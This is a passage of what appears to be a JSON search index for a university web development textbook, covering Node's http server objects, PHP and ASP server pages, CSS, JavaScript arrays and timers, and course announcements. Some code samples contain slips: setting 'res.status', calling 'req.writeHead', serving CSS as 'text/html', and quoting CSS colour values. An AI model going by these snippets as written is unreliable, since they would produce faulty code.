	"content": "An important aspect to recognize about how Node\u0026rsquo;s http library operates is that all requests to the server are passed to the request handler function. Thus, you need to determine what to do with the incoming request as part of that function.\nWorking with the Request Object You will most likely use the information contained within the http.IncomingMessage object supplied as the first parameter to your request handler. We often use the name req for this parameter, short for request, as it represents the incoming HTTP request.\nSome of its properties we might use:\nThe req.method parameter indicates what HTTP method the request is using. For example, if the method is \u0026quot;GET\u0026quot;, we would expect that the client is requesting a resource like an HTML page or image file. If it were a \u0026quot;POST\u0026quot; request, we would think they are submitting something.\nThe req.url parameter indicates the specific resource path the client is requesting, i.e. \u0026quot;/about.html\u0026quot; suggests they are looking for the \u0026ldquo;about\u0026rdquo; page. The url can have more parts than just the path. It also can contain a query string and a hash string. We\u0026rsquo;ll talk more about these soon.\nThe req.headers parameter contains all the headers that were set on this particular request. Of specific interest are authentication headers (which help say who is behind the request and determine if the server should allow the request), and cookie headers. We\u0026rsquo;ll talk more about this a bit further into the course, when we introduce the associated concepts.\nGenerally, we use properties in combination to determine what the correct response is. As a programmer, you probably already realize that this decision-making process must involve some sort of control flow structure, like an if statement or switch case statement.\nLet\u0026rsquo;s say we only want to handle \u0026quot;GET\u0026quot; requests for the files index.html, site.css, and site.js. We could write our request handler using both an if else statement and a switch statement:\nfunction handleRequest(req, res) { if(req.method === \u0026#34;GET\u0026#34;) { switch(req.url) { case \u0026#34;/index.html\u0026#34;: // TODO: Serve the index page break; case \u0026#34;/site.css\u0026#34;: // TODO: Serve the css file break; case \u0026#34;/site.js\u0026#34;: // TODO: Serve the js file break; default: // TODO: Serve a 404 Not Found response } } else { // TODO: Serve a 501 Not Implemented response } } Notice that at each branching point of our control flow, we serve some kind of response to the requesting web client. Every request should be sent a response - even unsuccessful ones. If we do not, then the browser will timeout, and report a timeout error to the user.\nWorking with the Response Object The second half of responding to requests is putting together the response. You will use the http.ServerResponse object to assemble and send the response. This response consists of a status code and message, response headers, and a body which could be text, binary data, or nothing.\nThere are a number of properties and methods defined in the http.ServerResponse to help with this, including:\nServerResponse.statusCode can be used to manually set the status code ServerResponse.statusMessage can be used to manually set the status message. If the code is set but not the message, the default message for the code is used. ServerResponse.setHeader() adds a header with the supplied name and value (the first and second parameters) ServerResponse.end() sends the request using the currently set status and headers. Takes an optional parameter which is the response body; if this parameter is supplied, an optional second parameter specifying the encoding can also be used. A final optional callback can be supplied that is called when sending the stream is complete. Consider the 501 Not Implemented response in our example above. We need to send the 501 status code, but there is no need for a body or additional headers. We could use the req.statusCode property to set the property, and the req.end() method to send it:\n// TODO: Serve a 501 Not Implemented response res.status = 501; res.end(); The sending of a response with a body is a bit more involved. For example, to send the index.html file, we would need to retrieve it from the hard drive and send it as the body of a request. But as the default status code is 200, we don\u0026rsquo;t need to specify it. However, it is a good idea to specify the Content-Type header with the appropriate mime-type, and then we can use the res.end() method with the file body once we\u0026rsquo;ve loaded it, i.e.:\n// TODO: Serve the index page fs.readFile(\u0026#39;index.html\u0026#39;, (err, body) =\u0026gt; { if(err) { res.status = 500; res.end(); return; } res.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); res.setHeader(\u0026#34;Content-Length\u0026#34;, body.length); res.end(body, \u0026#34;utf8\u0026#34;); }); Notice too, that we need to account for the possibility of an error while loading the file index.html. If this happens, we send a 500 Server Error status code indicating that something went wrong, and it happened on our end, not because of a problem in the way the client formatted the request. Notice too that we use a return to prevent executing the rest of our code.\nWe also supply the length of the response body, which will be the same as the buffer length or the length of a string sent as the body. Binary data for the web is counted in octets (eight bits) which conveniently is also how Node buffers are sized and the size of a JavaScript character.\nChaining writeHead() and end() The http.ServerResponse object also has a method writeHead() which combines the writing of status code, message, and headers into a single step, and returns the modified object so its end() method can be chained. In this way, you can write the entire sending of a response on a single line. The parameters to response.writeHead() are the status code, an optional status message, and an optional JavaScript object representing the headers, using the keys as the header names and values as values.\nServing the css file using this approach would look like:\n// TODO: Serve the site css file fs.readFile(\u0026#39;site.css\u0026#39;, (err, body) =\u0026gt; { if(err) return res.writeHead(500).end(); res.writeHead(200, { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;Content-Length\u0026#34;: body.length }).end(body, \u0026#34;utf8\u0026#34;); }); You can use any combination of these approaches to send responses. Warning\nSome important considerations:\nBe aware that you can only send one response per request. Once a response is sent, the connection to the client is effectively closed. Thus, once response.end() has been invoked, it will log an error if it is attempted again. The response.writeHead() method actually streams the head to the client. Thus, you cannot run response.setHeader() or set response.statusCode or response.statusMessage after it has been set. Similarly, any change to the response object after response.end() has been invoked will log an error, as you cannot change the response once it\u0026rsquo;s sent. "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/03-server-pages/",
	"title": "Server Pages",
	"tags": [],
	"description": "",
	"content": "The CGI scripting approach eventually evolved into a concept known as server pages and embodied in the technologies of PHP and Microsoft’s Active Server Pages (ASP), as well as Java Server Pages, and many other less-well-known technologies. While each of these use different scripting languages, the basic idea is the same: Take a traditional static webserver functionality, and couple it with a script interpreter. When most files are requested from the server, the file is served using the same techniques we used in the last chapter. But when a script file understood by our augmented server is requested, the script file is executed, and its output is sent as the response.\nThis may sound a lot like the CGI Scripts we discussed before, and it certainly is, except for two major innovations. The first of these was that the same interpreter, and therefore OS process, could be used for all requests. As server hardware adopted multiple CPUs and multi-core CPUs, additional interpreter processes were added, allowing incoming requests to be responded to concurrently on separate processors.\nEmbedded Scripts The second big innovation innovation was the idea of embedding script directly in HTML code. When the server page is interpreted, the embedded scripts would execute, and their output would be concatenated directly into the HTML that was being served.\nFor example, a PHP page might look like this:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;PHP Example\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;A PHP Example\u0026lt;/h1\u0026gt; \u0026lt;?php echo date(\u0026#39;D, d M Y H:i:s\u0026#39;); ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Notice everything except the \u0026lt;?php ... ?\u0026gt; is perfectly standard HTML. But when served by an Apache server with mod_php installed, the code within \u0026lt;?php ... ?\u0026gt; would be executed, and its output concatenated into the HTML that would then be served (the echo function prints output, and date() creates the current time in the specified format).\nSimilarly, an ASP page doing the same task would look like:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;ASP Example\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;An ASP Example\u0026lt;/h1\u0026gt; \u0026lt;% Response.Write Now() %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; These files would typically be saved with a special extension that the server would recognize, i.e. .php for PHP files, and .asp for ASP files. Allowing scripts to be directly embedded within HTML made web development with these tools far faster, and as IDEs were adapted to support syntax highlighting, code completion, and other assistive features with these file types also helped prevent syntax errors in both the HTML and script code.\nActive Server Pages and PHP remain commonly used technologies today, and a large portion of legacy websites built using them are still in service. In fact, your personal web space on the CS department server is running in an Apache server set up to interpret PHP files - you could add a PHP script like the one above and and it would execute when you visited the page. You can visit the support Personal Web Pages entry for details on doing so.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/03-web-framework-characteristics/",
	"title": "Web Framework Characteristics",
	"tags": [],
	"description": "",
	"content": "Web frameworks can be classified in a number of ways, but there are several that you will see pop up in discussions. For example, an opinionated web framework is one that was developed with a strict software architecture that developers are expected to follow. While it may be possible to deviate from this expected structure, to do so often causes significant headaches and coding challenges. Ruby on Rails is a good example of an opinionated framework - there is a Rails Way of writing a Ruby on Rails application, and deviating from that way will require a lot more work on your part.\nOther frameworks do not try to impose a structure - merely offer a suite of tools to use as you see fit. While this comes with a great degree of freedom, it also means that you can find wildly divergent example code written using the framework. Express is a great example of this kind of framework - it is essentially a router that has the ability to add a template library (of your choice) and a database library (of your choice), and does not expect you to lay out your files in any specific way.\nAnother aspect to frameworks is what kinds of architectural patterns they adopt. Ruby on Rails, Django, and Microsoft\u0026rsquo;s MVC, all use a Model-View-Controller architecture. Express and Phoenix adopt a Pipeline architecture. Microsoft\u0026rsquo;s Razor Pages, while built on Microsoft MVC, have gone back to a page-based architecture similar to the server pages we spoke of previously, as does Next.JS.\nA third distinction is if the framework is server-side (meaning it runs on the server) or client-side (meaning it consists of a JavaScript program that runs in the browser), or a hybrid of the two. Ruby on Rails, Django, Microsoft\u0026rsquo;s MVC, Express, and Phoenix are all server-side frameworks - they do the bulk of the work of creating the HTML being served on the server. React, Vue, and Angular are all client-side frameworks that create their HTML dynamically in the browser using JavaScript, typically through making requests against a web API. Meteor and NextJS are hybrids that provide both client-side and server-side libraries.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/03-where-to-find-help/",
	"title": "Where to Find Help",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nResources Slides K-State IT Help Desk - Email helpdesk@ksu.edu Syllabus K-State Online Canvas Help Instructure Canvas Guides Codio Documentation K-State Libraries K-State CS Support K-State CS Discord K-State CS Advising K-State Engineering Student Services K-State Office of Student Life K-State Report It As you work on the materials in this course, you may run into questions or problems and need assistance. This video reviews the various types of help available to you in this course.\nFirst and foremost, anytime you have a questions or need assistance in the course, please post in the course Discord room. It is the best place to go to get help with anything related to this course, from the tutorials and projects to issues with Codio and Canvas. Before you post on Discord, take a minute to look around and make sure the question has not already been posted before. It will save everyone quite a bit of time.\nThere are a few major reasons we’ve chosen to use Discord in this program. Our goal is to respond as quickly as possible, and having a single place for all questions allows the instructors and the TAs to work together to answer questions and solve problems quickly. As an added bonus, it reduces the amount of email generated by the class. Discord includes lots of features to make your messages easily readable using both markdown and code blocks. Finally, by participating in discussions on Discord and helping to answer questions from your fellow students, you can earn extra credit points!\nOf course, as another step you can always exercise your information-gathering skills and use online search tools such as Google to answer your question. While you are not allowed to search online for direct solutions to assignments or projects, you are more than welcome to use Google to access programming resources such as the Mozilla Developer Network, Node language documentation, CSS-Tricks, StackOverflow, and other tutorials. I can definitely assure you that programmers working in industry are often using Google and other online resources to solve problems, so there is no reason why you shouldn’t start building that skill now.\nIf all else fails, please email me and let me know. Make sure you clearly explain your question and the steps you\u0026rsquo;ve taken to solve it thus far. If I feel it can be easily answered by one of the earlier steps, I may redirect you back to those before answering it directly. But, at times there are indeed questions that come up that don\u0026rsquo;t have an easy answer, and I\u0026rsquo;m more than happy to help answer them as needed.\nBeyond Discord, there are a few resources you should be aware of. First, if you have any issues working with K-State Canvas, K-State IT resources, or any other technology related to the delivery of the course, your first source of help is the K-State IT Helpdesk. They can easily be reached via email at helpdesk@ksu.edu. Beyond them, there are many online resources for using Canvas, all of which are linked in the resources section below the video. As a last resort, you may also want to post in Discord, but in most cases we may simply redirect you to the K-State helpdesk for assistance.\nSimilarly, if you have any issues using the Codio platform, you are welcome to refer to their online documentation. Their support staff offers a quick and easy chat interface where you can ask questions and get feedback within a few minutes.\nNext, we have grading and administrative issues. This could include problems or mistakes in the grade you received on a project, missing course resources, or any concerns you have regarding the course and the conduct of myself and your peers. Since this is an online course, you’ll be interacting with us on a variety of online platforms, and sometimes things happen that are inappropriate or offensive. There are lots of resources at K-State to help you with those situations. First and foremost, please DM me on Discord as soon as possible and let me know about your concern, if it is appropriate for me to be involved. If not, or if you’d rather talk with someone other than me about your issue, I encourage you to contact either your academic advisor, the CS department staff, College of Engineering Student Services, or the K-State Office of Student Life. Finally, if you have any concerns that you feel should be reported to K-State, you can do so at https://www.k-state.edu/report/. That site also has links to a large number of resources at K-State that you can use when you need help.\nFinally, if you find any errors or omissions in the course content, or have suggestions for additional resources to include in the course, DM the instructors on Discord. There are some extra credit points available for helping to improve the course, so be on the lookout for anything that you feel could be changed or improved.\nSo, in summary, Discord should always be your first stop when you have a question or run into a problem. For issues with Canvas or Codio, you are also welcome to refer directly to the resources for those platforms. For questions specifically related to the projects, use Discord for sure. For grading questions and errors in the course content or any other issues, please PM the instructors on Discord for assistance.\nOur goal in this program is to make sure that you have the resources available to you to be successful. Please don’t be afraid to take advantage of them and ask questions whenever you want.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/",
	"title": "Asynchronous JavaScript",
	"tags": [],
	"description": "",
	"content": "Chapter 3 Asynchronous JavaScript Parallel Processing Made Easy\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week06/",
	"title": "Summer &#39;22 Week 6",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello, and welcome to the week six Announcements video for CIS 527 and CC 515 in summer 2022. This week, you should be wrapping up milestone four, which is due today. So make sure you get that submitted on time and it\u0026rsquo;s ready to be graded. Then this week, you\u0026rsquo;ll be working on the week six lessons which are due this Friday. And then Monday, you\u0026rsquo;re going to have another milestone, which is milestone five. So start working on that as soon as you can.\nWeek Six is all about a lot of different things related to full stack web development, we\u0026rsquo;re going to introduce user authentication. So how do we actually authenticate our users with a password? How do we keep track of sessions and roles, so we\u0026rsquo;ll see a lot of that. We\u0026rsquo;re going to start talking about web API\u0026rsquo;s a little bit, we\u0026rsquo;ll also look at things like web hooks, how we can automatically deploy stuff and send stuff to another web server. And we\u0026rsquo;ll start talking about web frameworks. And so you\u0026rsquo;ll start looking at different ways you can build your website. And then this week, we\u0026rsquo;re going to continue the blog tutorial where you\u0026rsquo;ll have the last few bits of the blog tutorial, once the blog tutorial is done, you\u0026rsquo;ll have a full stack web development project under your belt. And then we\u0026rsquo;ll use a lot of that over the last couple of milestones to wrap up this course.\nMilestone five is obviously about adding authentication to your app. So you\u0026rsquo;re going to need to add all of the forms and routes to manage logging in as a user logging out as a user creating a new user, you\u0026rsquo;re also going to protect a few of the routes. So the logged in users can do certain things that unauthenticated users can\u0026rsquo;t do. When they create a request, you\u0026rsquo;re going to actually linked that request to the user itself. So only logged in users can add requests and the request itself will be tied to that user. This will involve some database changes. So make sure you\u0026rsquo;re very careful. Make backups of your database if you need to, for those of you in CC 515 that maybe haven\u0026rsquo;t had a database course, if you get stuck on the database changes, let me know. And I\u0026rsquo;m willing to help you a little bit on that so that you can get past that and get working on this milestone. So that\u0026rsquo;s really it for this week.\nAs always, if you have questions you can keep in touch on Discord, I have time office hours on Tuesdays and Fridays, you\u0026rsquo;re welcome to join and just hang out while you work on assignments. I do one on one office hours via Calendly. So if you need any help in person, you can schedule a zoom time with me on Calendly. My all of my times are available there. Other than that, you\u0026rsquo;ll be working on users and passwords. Hopefully you know that you should make your passwords pretty complex. So don\u0026rsquo;t use 12345. Especially if it\u0026rsquo;s the same number on your luggage. Good luck this week on adding user authentication to your milestone. As always, if have any questions, let me know and I look forward to seeing you again next week.\nMilestone 4 Overview Video Script Hi, everyone, I\u0026rsquo;m getting a lot of questions on milestone four. So I wanted to take just a minute and show you what a model solution looks like just so you can visualize in your head what this should be doing. So this is my model solution for milestone for the first three parts of the milestone are really just about switching your application over to be an Express app, and then getting the existing homepage to work. And so I was able to reuse my index dot HTML and site.js from previous milestones, all I really had to do was change it so that instead of serving the box locations dot json file, we want to serve box locations from the database using an express route. And so this makes a JSON request to box locations as a route and express that will read data from the database and send it back. But the rest of my front end stays the same, the rendering code and everything in site.js stays the same. The big differences, this is all client side rendered instead of server side rendered, which you have to keep in mind, especially as we start moving into the new database. But the big thing that you\u0026rsquo;re doing here is once you have this index page rendered, we want each of these to be clickable, somehow, you can make a button where you can just make the whole div clickable. And then when we click on this, this is what goes to what are points four, and five, where you\u0026rsquo;re going to make a table in the database, and you\u0026rsquo;re going to make a templates, using either EJS or pug or handlebars, whatever you\u0026rsquo;re comfortable with. But you\u0026rsquo;re going to make a template at the URL box locations ID that will show information for a single box. And it will have information below for the requests for that box. And so once you get the requests working, you\u0026rsquo;ll have a list of requests that have been requested here. So you see there\u0026rsquo;s a request for birdseed in this box. And then if I want to add another request, such as let\u0026rsquo;s say we want ice cream, I can add ice cream here and hit submit. And it will submit in the background to that box locations slash one slash requests. And it will add that to the database redirect me here. And now I see ice cream here in this requests. So that\u0026rsquo;s really what you\u0026rsquo;re trying to do with this milestone, there are a few different parts, I really recommend starting by getting your homepage working again, by just setting up that box locations route that it will actually be able to request via JSON. You\u0026rsquo;ll notice here it takes a little bit of time to actually request it because I\u0026rsquo;ve got things running on my machine right now. But get this working. So your homepage still works the way it was, this can still be out of your static file client side rendered. You don\u0026rsquo;t need to make a template for this. But then when you click on one of these, it should make this out of a template. And then you\u0026rsquo;ll also have a requests form here where you can make a request submit it and it will keep track of that request. So make sure you work on that. If you have any questions let me know\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/04-applying-rules/",
	"title": "Applying CSS Rules",
	"tags": [],
	"description": "",
	"content": "There are multiple ways CSS rules can be applied to HTML elements. A document containing CSS rules can be attached to a HTML document with a \u0026lt;link\u0026gt; element, embedded directly into the html page with a \u0026lt;style\u0026gt; element, or applied directly to a HTML element with the style attribute. Let\u0026rsquo;s look at each option.\nLinked CSS Documents The \u0026lt;link\u0026gt; HTML element can be used to link the HTML page it appears in to a text file of CSS rules. These rules will then be applied to the HTML elements in the HTML document.\nThe \u0026lt;link\u0026gt; element should provide a hypertext reference attribute (href) providing a location for the linked document, and a relationship attribute (rel) describing the relationship between the HTML document and the stylesheet (hint: for a stylesheet the relationship is \u0026quot;stylesheet\u0026quot;). If either of these attributes is missing or invalid, the stylesheet\u0026rsquo;s rules will not be used.\nFor example, if the stylesheet is in the file styles.css, and our page is page.html, and both reside at the root of our website, the \u0026lt;link\u0026gt; element would be:\n\u0026lt;link href=\u0026quot;/styles.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot;/\u0026gt;\nBy placing our CSS rules in a separate file and linking them to where they are used, we can minimize code duplication. This approach also contributes to the separation of concerns. Thus, it is widely seen as a best practice for web development.\nThe \u0026lt;link\u0026gt; element should be declared within the \u0026lt;head\u0026gt; element.\nHTML \u0026lt;style\u0026gt; Element The \u0026lt;style\u0026gt; HTML element can be used to embed CSS rules directly in an HTML page. Its content is the CSS rules to be applied. The \u0026lt;style\u0026gt; element must be a child of a \u0026lt;head\u0026gt; or \u0026lt;body\u0026gt; element, though placing it into the \u0026lt;head\u0026gt; element is best practice.\nTo repeat our earlier efforts of making paragraphs have red text and green backgrounds with the \u0026lt;style\u0026gt; element:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Style Element Example\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; p { color: \u0026#39;red\u0026#39;; background-color: \u0026#39;green\u0026#39;; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Unlike the \u0026lt;link\u0026gt; element approach, CSS rules defined with the \u0026lt;style\u0026gt; element can only be used with one file - the one in which they are embedded. Thus, it can lead to code duplication. And embedding CSS rules in an HTML document also breaks the separation of concerns design principle.\nHowever, there are several use cases for which the \u0026lt;style\u0026gt; element is a good fit. Most obvious is a HTML page that is being distributed as a file, rather than hosted on a server. If the style information is embedded in that HTML file, the recipient only needs to receive the one file, rather than two. Similarly, emails with HTML bodies typically use a \u0026lt;style\u0026gt; element to add styling to the email body.\nThe HTML Element Style Attribute The style attribute of any HTML element can be used to apply CSS rules to that specific element. These rules are provided a string consisting of key/value pairs separated by semicolons. For example:\n\u0026lt;p\u0026gt;This is a normal paragraph.\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;color: orange; font-weight: bold\u0026#34;\u0026gt;But this one has inline styles applied to it.\u0026lt;/p\u0026gt; Produces this:\nThis is a normal paragraph.\nBut this one has inline styles applied to it.\nIt should be clear from a casual glance that inline styles will make your code more difficult to maintain, as your styling rules will be scattered throughout a HTML document, instead of collected into a \u0026lt;style\u0026gt; element or housed in a separate CSS file. And while inline styles can be used to selectively modify individual elements, CSS selectors (covered in the previous section) are typically a better approach.\nWhere inline styles make the most sense is when we manipulate the elements on the page directly using JavaScript. Also, the browser developer tools let us manipulate inline styles directly, which can be helpful when tweaking a design. Finally, some component-based design approaches (such as React) pivot the Separation of Concerns design principle to break a user interface into autonomous reusable components; in this approach content, style, and functionality are merged at the component level, making inline styles more appropriate.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/04-arrays-and-lists/",
	"title": "Arrays - Lists by Another Name",
	"tags": [],
	"description": "",
	"content": " CONSOLE You might have noticed we used an array in discussing the for .. in loop, but didn\u0026rsquo;t talk about it in our data type discussion. This is because in JavaScript, an array is not a primitive data type. Rather, it\u0026rsquo;s a special kind of object.\nThis is one of those aspects of JavaScript that breaks strongly with imperative languages. Brandon Eich drew heavily from Scheme, which is a functional language that focuses heavily on list processing\u0026hellip; and the JavaScript array actually has more to do with lists than it does arrays.\nDeclaring Arrays JavaScript arrays can be declared using literal syntax:\nvar arr = [1, \u0026#34;foo\u0026#34;, true, 3.2, null]; Notice how we can put any kind of data type into our array? We can also put an array in an array:\nvar arr2 = [arr, [1,3,4], [\u0026#34;foo\u0026#34;,\u0026#34;bar\u0026#34;]]; We can create the effect of an n-dimensional array, though in practice we\u0026rsquo;re creating what we call jagged arrays in computer science.\nClearly if we can do this, the JavaScript array is a very different beast than a Java or C# one.\nAccessing Array Values We can access an element in an array with bracket notation, i.e.:\nvar arr = [1, \u0026#34;foo\u0026#34;, true, 3.2, null]; console.log(arr[3]) will print true. We index arrays starting at 0, just as we are used to .\nBut what if we try accessing an index that is \u0026ldquo;out of bounds\u0026rdquo;? Try it:\nvar arr = [1,2,3,4]; console.log(arr[80]); We don\u0026rsquo;t get an exception, just an undefined, because that value doesn\u0026rsquo;t exist yet. Let\u0026rsquo;s take the same array and give it a value there:\narr[80] = 5; console.log(arr[80]); Now we see our value. But what about the values between arr[3] and arr[80]? If we try printing them, we\u0026rsquo;ll see a value of undefined. But remember how we said an array is a special kind of object? Let\u0026rsquo;s iterate over its keys and values with a for .. in loop:\nfor(key in arr) { console.log(`The index ${key} has value ${arr[key]}`); } Notice how we only print values for indices 0,1,2,3, and 80? The array is really just a special case of the object, using indices as property keys to store values. Everything in the array is effectively stored by reference\u0026hellip; which means all the rules we learned about optimizing array algorithms won\u0026rsquo;t apply here.\nArrays as Special-Purpose Data Structures You\u0026rsquo;ve also learned about a lot of specialty data structures in prior courses - stacks, queues, etc. Before you write one in JavaScript though, you may be interested to know that JavaScript arrays can emulate these with their built-in methods.\nStacks We push new elements to the top of the stack, and pop them off. The array methods push() and pop() duplicate this behavior by pushing and popping items from the end of the array.\nFIFO queues A first-in-first-out queue can be mimicked with the array methods push() and shift() which push new items to the end of the array and remove the first item, respectively.\nAnother useful method is unshift(), which adds a new element to the front of the array.\nMost data types you\u0026rsquo;ve learned about in prior courses can be emulated with some combination of JavaScript arrays and objects, including various flavors of trees, priority queues, and tries. Granted, these will not be as performant as their equivalents written in C, but they will serve for most web app needs.\nMap Reduce One of the most powerful patterns JavaScript adopted from list-processing languages is the map and reduce patterns. You may have heard of MapReduce in terms of Big Data - that is exactly these two patterns used in combination. Let\u0026rsquo;s examine how they are used in JavaScript.\nMap The basic idea of mapping is to process a list one element at a time, returning a new list containing the processed elements. In JavaScript, we implement it with the map() method of the array. It takes a function as an argument, which is invoked on each item in the array, and returns the newly processed array (the old array stays the same).\nThe function supplied to map() is supplied with three arguments - the item currently iterated, the index of the item in the array, and a reference to the original array. Of course, you don\u0026rsquo;t have to define your function with the second or third arguments.\nLet\u0026rsquo;s try a simple example:\nvar squares = [1,2,3,4].map((item) =\u0026gt; {return item * item}) This code squares each of the numbers in the array, and sets squares to have as a value the array of newly-created squares.\nNotice too how by passing a function into the map function, we create a new scope for each iteration? This is how JavaScript has long dealt with the challenge of functional scope - by using functions!\nReduce The reduce pattern also operates on a list, but it reduces the list to a single result. In JavaScript, it is implemented with the array\u0026rsquo;s reduce() method. The method takes two arguments - a reducer function and an initial accumulator value. Each time the reduce function iterates, it performs an operation on the currently iterated item and the accumulator. The accumulator is then passed forward to the next iteration, until it is returned at the end.\nThe function supplied to reduce has four arguments - the current accumulator value, the current iterated item, the item\u0026rsquo;s index, and the original array. As with map(), we can leave out the last two arguments if we don\u0026rsquo;t need to use them.\nA common example of reduce() in action is to sum an array:\nvar sum = [1, 2, 3, 4, 5].reduce((acc, item) =\u0026gt; {return acc + item}, 0); We supply the initial value of the accumulator as identity for addition, 0, and each iteration the current item in the array is added to it. At the end, the final value is returned.\nMapReduce And as we said before, MapReduce is a combination of the two, i.e. we can calculate the sum of squares by combining our two examples:\nvar sumOfSquares = [1,2,3,4,5].map((item) =\u0026gt; { return item * item }).reduce((acc, item) =\u0026gt; { return acc + item }); Notice how we invoked the map() function on the original array, and then invoked reduce() on the returned array? This is a syntax known as method chaining, which can make for concise code. We could also have assigned each result to a variable, and then invoked the next method on that variable.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/04-asynchronous-programming/",
	"title": "Asynchronous Programming",
	"tags": [],
	"description": "",
	"content": "In asynchronous programming, memory collisions are avoided by not sharing memory between threads. A unit of work that can be done in parallel is split off and handed to another thread, and any data it needs is copied into that threads\u0026rsquo; memory space. When the work is complete, the second thread notifies the primary thread if the work was completed successfully or not, and provides the resulting data or error.\nIn JavaScript, this notification is pushed into the event queue, and the main thread processes it when the event loop pulls the result off the event queue. Thus, the only memory that is shared between the code you\u0026rsquo;ve written in the Event Loop and the code running in the asynchronous process is the memory invovled in the event queue. Keeping this memory thread-safe is managed by the JavaScript interpreter. Thus, the code you write (which runs in the Event Loop) is essentially single-threaded, even if your JavaScript application is using some form of parallel processing!\nLet\u0026rsquo;s reconsider a topic we\u0026rsquo;ve already discussed with this new understanding - timers. When we invoke setTimer(), we are creating a timer that is managed asynchronously. When the timer elapses, it creates a timer \u0026rsquo;event\u0026rsquo; and adds it to the event queue. We can see this in the diagram below.\nHowever, the timer is not actually an event, in the same sense that a 'click' or 'keydown' event is\u0026hellip; in that those events are provided to the browser from the operating system, and the browser passes them along into the JavaScript interpreter, possibly with some transformation. In contrast, the timer is created from within the JavaScript code, though its triggering is managed asynchronously.\nIn fact, both timers and events represent this style of asynchronous processing - both are managed by creating messages that are placed on the event queue to be processed by the interpreter. But the timer provides an important example of how asynchronous programming works. Consider this code that creates a timer that triggers after 0 milliseconds:\nsetTimeout(()=\u0026gt;{ console.log(\u0026#34;Timer expired!\u0026#34;); }, 0); console.log(\u0026#34;I just set a timer.\u0026#34;); What will be printed first? The \u0026ldquo;Timer expired!\u0026rdquo; message or the \u0026ldquo;I just set a timer.\u0026rdquo; message?\nSee for yourself - try running this code in the console (you can click the \u0026ldquo;console\u0026rdquo; tab below to open it).\nThe answer is that \u0026ldquo;I just set a timer\u0026rdquo; will always be printed first, because the second message won\u0026rsquo;t be printed until the event loop pulls the timer message off the queue, and the line printing \u0026ldquo;I just set a timer\u0026rdquo; is executed as part of this pass in the event loop. The setTimeout() and setInterval() functions are what we call asynchronous functions, as they trigger an asynchronous process. Once that process is triggered, execution immediately continues within the event loop, while the triggered process runs in parallel. Asynchronous functions typically take a function as an argument, known as a callback function, which will be triggered when the message corresponding to the asynchronous process is pulled off the event queue.\nWarning\nAny code appearing after a call to an asynchronous function will be executed immediately after the asynchronous function is invoked, regardless of how quickly the asynchronous process generates its message and adds it to the event queue.\nAs JavaScript was expanded to take on new functionality, this asynchronous mechanism was re-used. Next, we\u0026rsquo;ll take a look at an example of this in the use of web workers.\nCONSOLE "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/04-custom-servers/",
	"title": "Custom Servers",
	"tags": [],
	"description": "",
	"content": "While CGI Scripts and Server Pages offered ways to build dynamic websites using off-the shelf web server technologies (Apache, IIS), many programmers found these approaches limiting. Instead, they sought to build the entire web server as a custom program.\nNode was actually developed for exactly this approach - it provides abstractions around the fundamental aspects of HTTP in its http library. This library handles the listening for HTTP requests, and parses the request and uses it to populate a http.ClientRequest object and provides a http.ServerResponse object to prepare and send the response. These are abstractions around the HTTP Request and Response we discussed in chapter 2.\nThe authors of Node took advantage of the functional nature of JavaScript to make writing servers easy - we just need to provide a function to the server that takes a request/response pair. This has been our handleRequest() method, and we can pack it with custom logic to determine the correct response for the incoming request.\nWe\u0026rsquo;ve already written a number of functions that take in a request and response object, and determine the correct response to send. This includes our serveFile(), and our listDirectory(). We can create dynamic pages in much the same way - by writing a custom function to serve the dynamic page.\nFor example, a very simple dynamic page could be created with this function:\nfunction serveTime(req, res) { var html = ` \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Server Time\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Time on the server is ${new Date()}\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; `; req.writeHead(200, { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;Content-Length\u0026#34;: html.length }).end(html); } But for a server to be dynamic, we typically want more than just the ability to render a page from code. We also want to interact with the user in some meaningful way - and that means receiving data from them. In the HTTP protocol there are several ways for the user to send data:\nBy the path of the request, i.e. when we request https://support.cs.ksu.edu/CISDocs/wiki/Main_Page the path CISDocs/wiki/Main_Page indicates the page we are 